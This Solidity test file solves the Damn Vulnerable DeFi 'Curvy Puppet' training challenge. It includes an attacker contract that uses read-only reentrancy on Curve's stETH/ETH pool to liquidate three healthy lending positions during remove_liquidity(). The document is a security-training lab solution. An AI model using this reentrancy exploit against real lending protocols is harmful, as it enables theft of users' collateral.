// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

// Set MAINNET_FORKING_URL in your .env file.
// Run with: forge test --mp test/curvy-puppet/CurvyPuppet.t.sol --fork-url $MAINNET_RPC_URL

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

contract CurvyPuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address treasury = makeAddr("treasury");

    // Users' accounts
    address alice   = makeAddr("alice");
    address bob     = makeAddr("bob");
    address charlie = makeAddr("charlie");

    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // Relevant Ethereum mainnet addresses
    IPermit2    constant permit2   = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20      constant stETH     = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH        constant weth      = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    uint256 constant TREASURY_WETH_BALANCE          = 200e18;
    uint256 constant TREASURY_LP_BALANCE            = 65e17;
    uint256 constant LENDER_INITIAL_LP_BALANCE      = 1000e18;
    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
    uint256 constant USER_BORROW_AMOUNT             = 1e18;
    uint256 constant ETHER_PRICE                    = 4000e18;
    uint256 constant DVT_PRICE                      = 10e18;

    DamnValuableToken  dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle  oracle;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);

        startHoax(deployer);

        // Deploy DVT token (collateral asset in the lending contract)
        dvt = new DamnValuableToken();

        // Deploy price oracle and set prices for ETH and DVT
        oracle = new CurvyPuppetOracle();
        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});

        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
        lending = new CurvyPuppetLending({
            _collateralAsset: address(dvt),
            _curvePool: curvePool,
            _permit2: permit2,
            _oracle: oracle
        });

        // Fund treasury account with WETH and approve player's expenses
        deal(address(weth), treasury, TREASURY_WETH_BALANCE);

        // Fund lending pool and treasury with initial LP tokens
        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);

        // Treasury approves assets to player
        vm.startPrank(treasury);
        weth.approve(player, TREASURY_WETH_BALANCE);
        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);

        // Users open 3 positions in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            // Fund user with some collateral
            vm.startPrank(deployer);
            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
            // User deposits + borrows from lending contract
            _openPositionFor(users[i]);
        }
    }

    /**
     * Utility function used during setup of challenge to open users' positions in the lending contract
     */
    function _openPositionFor(address who) private {
        vm.startPrank(who);
        // Approve and deposit collateral
        address collateralAsset = lending.collateralAsset();
        // Allow permit2 handle token transfers
        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
        // Allow lending contract to pull collateral
        permit2.approve({
            token: lending.collateralAsset(),
            spender: address(lending),
            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
            expiration: uint48(block.timestamp)
        });
        // Deposit collateral + borrow
        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
        lending.borrow(USER_BORROW_AMOUNT);
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Player balances
        assertEq(dvt.balanceOf(player), 0);
        assertEq(stETH.balanceOf(player), 0);
        assertEq(weth.balanceOf(player), 0);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);

        // Treasury balances
        assertEq(dvt.balanceOf(treasury), 0);
        assertEq(stETH.balanceOf(treasury), 0);
        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);

        // Curve pool trades the expected assets
        assertEq(curvePool.coins(0), ETH);
        assertEq(curvePool.coins(1), address(stETH));

        // Correct collateral and borrow assets in lending contract
        assertEq(lending.collateralAsset(), address(dvt));
        assertEq(lending.borrowAsset(), curvePool.lp_token());

        // Users opened position in the lending contract
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
            uint256 borrowAmount     = lending.getBorrowAmount(users[i]);
            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
            assertEq(borrowAmount, USER_BORROW_AMOUNT);

            // User is sufficiently collateralized
            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
        }
    }

    /**
     * =========================================================
     * SOLUTION — test_curvyPuppet()
     * =========================================================
     * Attack: Read-only reentrancy on Curve get_virtual_price()
     *
     * CurvyPuppetLending._getLPTokenPrice() reads get_virtual_price()
     * from the live Curve stETH/ETH pool. During remove_liquidity(),
     * Curve sends ETH to the caller BEFORE updating its internal
     * balances — get_virtual_price() is stale/inflated at this point.
     *
     * Inflated LP price → getBorrowValue() spikes → healthy positions
     * appear to exceed the liquidation threshold → all three can be
     * liquidated inside the reentrancy window.
     *
     * Attack flow (runs through CurvyPuppetAttacker):
     * 1. Pull treasury WETH + LP tokens via transferFrom
     * 2. Unwrap WETH → ETH, add to Curve → receive LP tokens
     * 3. Set Permit2 approvals for LP repayment (must be done before
     *    entering reentrancy window — cannot set inside receive())
     * 4. call remove_liquidity() → Curve sends ETH → receive() fires
     *    Inside receive():
     *      - get_virtual_price() is inflated
     *      - liquidate(alice), liquidate(bob), liquidate(charlie)
     *      - seize 2500 DVT each = 7500 DVT total
     * 5. Wrap remaining ETH → WETH
     * 6. Transfer all assets back to treasury
     *
     * _isSolved() requires:
     *   - All 3 positions fully closed
     *   - Treasury receives exactly 7500 DVT
     *   - Treasury still holds WETH and LP tokens (don't use all funds)
     *   - Player holds nothing
     *
     * Requires: MAINNET_FORKING_URL in .env (forks block 20,190,356)
     * =========================================================
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        new CurvyPuppetAttacker{value: 0}(
            dvt, lending, curvePool, weth, permit2, treasury, alice, bob, charlie
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All users' positions are closed
        address[3] memory users = [alice, bob, charlie];
        for (uint256 i = 0; i < users.length; i++) {
            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
        }

        // Treasury still has funds left
        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");

        // Player has nothing
        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
    }
}

/**
 * =========================================================
 * SOLUTION CONTRACT — CurvyPuppetAttacker
 * =========================================================
 * Orchestrates the read-only reentrancy attack against
 * CurvyPuppetLending via Curve's stETH/ETH pool.
 *
 * Constructor runs the full attack atomically:
 *   - Pulls treasury WETH + LP tokens
 *   - Adds ETH liquidity to Curve
 *   - Sets Permit2 approvals before entering the window
 *   - Triggers remove_liquidity() to open the reentrancy window
 *   - Liquidates all three positions inside receive()
 *   - Returns all assets to treasury
 *
 * receive() is called by Curve mid-remove_liquidity() when ETH
 * is sent — this is the reentrancy window where get_virtual_price()
 * is stale and positions appear liquidatable.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Exploit contract for CurvyPuppet read-only reentrancy attack
 * @dev Curve sends ETH to this contract during remove_liquidity() before
 *      updating pool balances. Inside receive(), get_virtual_price() is
 *      inflated, making all three user positions liquidatable.
 */
contract CurvyPuppetAttacker {

    DamnValuableToken  dvt;
    CurvyPuppetLending lending;
    IStableSwap        curvePool;
    WETH               weth;
    IPermit2           permit2;
    address            treasury;
    address            alice;
    address            bob;
    address            charlie;
    IERC20             lpToken;

    /**
     * @param _dvt       DamnValuableToken (collateral asset)
     * @param _lending   CurvyPuppetLending contract to liquidate from
     * @param _curvePool Curve stETH/ETH pool (0xDC24...)
     * @param _weth      WETH contract
     * @param _permit2   Permit2 contract for LP token approvals
     * @param _treasury  Treasury address — source of funds + recipient of rescued assets
     * @param _alice     First victim to liquidate
     * @param _bob       Second victim to liquidate
     * @param _charlie   Third victim to liquidate
     */
    constructor(
        DamnValuableToken  _dvt,
        CurvyPuppetLending _lending,
        IStableSwap        _curvePool,
        WETH               _weth,
        IPermit2           _permit2,
        address            _treasury,
        address            _alice,
        address            _bob,
        address            _charlie
    ) payable {
        dvt       = _dvt;
        lending   = _lending;
        curvePool = _curvePool;
        weth      = _weth;
        permit2   = _permit2;
        treasury  = _treasury;
        alice     = _alice;
        bob       = _bob;
        charlie   = _charlie;
        lpToken   = IERC20(_curvePool.lp_token());

        // Step 1: Pull all treasury funds — WETH and LP tokens
        uint256 wethBalance = weth.balanceOf(treasury);
        uint256 lpBalance   = lpToken.balanceOf(treasury);
        weth.transferFrom(treasury, address(this), wethBalance);
        lpToken.transferFrom(treasury, address(this), lpBalance);

        // Step 2: Unwrap all WETH → ETH and add to Curve pool
        weth.withdraw(wethBalance);
        uint256[2] memory amounts = [address(this).balance, uint256(0)];
        curvePool.add_liquidity{value: address(this).balance}(amounts, 0);

        // Step 3: Set Permit2 approvals for LP token transfers BEFORE the reentrancy window
        // liquidate() calls _pullAssets() which uses permit2.transferFrom — must be approved first
        // Cannot set approvals from inside receive() as permit2.approve is not reentrant-safe
        uint256 totalLpNeeded = 3e18; // 3 users × 1e18 LP borrow each
        lpToken.approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: address(lpToken),
            spender: address(lending),
            amount: uint160(totalLpNeeded),
            expiration: uint48(block.timestamp + 1 days)
        });

        // Step 4: Trigger remove_liquidity() — Curve sends ETH → receive() fires (reentrancy window)
        uint256 lpToRemove = lpToken.balanceOf(address(this));
        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        curvePool.remove_liquidity(lpToRemove, minAmounts);

        // Step 5: Wrap remaining ETH back to WETH
        weth.deposit{value: address(this).balance}();

        // Step 6: Transfer everything back to treasury
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
        weth.transfer(treasury, weth.balanceOf(address(this)));
        uint256 remainingLp = lpToken.balanceOf(address(this));
        if (remainingLp > 0) lpToken.transfer(treasury, remainingLp);
    }

    /**
     * @notice Reentrancy window — called by Curve when sending ETH during remove_liquidity()
     * @dev At this point get_virtual_price() is stale/inflated — pool balances not yet updated.
     *      This makes getBorrowValue() spike, flipping healthy positions to liquidatable.
     *      liquidate() repays each user's 1e18 LP debt and seizes their 2500 DVT collateral.
     */
    receive() external payable {
        // During this window: get_virtual_price() inflated → borrowValue > collateralValue
        lending.liquidate(alice);
        lending.liquidate(bob);
        lending.liquidate(charlie);
    }
}
